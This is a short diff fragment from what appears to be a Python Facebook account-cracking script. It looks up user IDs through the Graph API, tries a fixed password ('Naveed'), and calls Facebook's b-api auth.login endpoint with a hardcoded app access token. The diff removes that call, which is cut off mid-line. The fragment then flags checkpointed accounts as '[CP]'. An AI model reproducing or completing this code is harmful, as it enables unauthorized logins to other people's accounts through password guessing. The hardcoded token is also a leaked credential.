@@ -279,7 +279,6 @@ def pb():
 			h=requests.get('https://graph.facebook.com/'+user+'/?access_token='+tb)
 			j=json.loads(h.text)
 			ps1=('Naveed')
-			dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk
 			k=json.load(dt)
 			if 'www.facebook.com' in k['error_msg']:
 			    print(S+'[CP] ♡ '+us
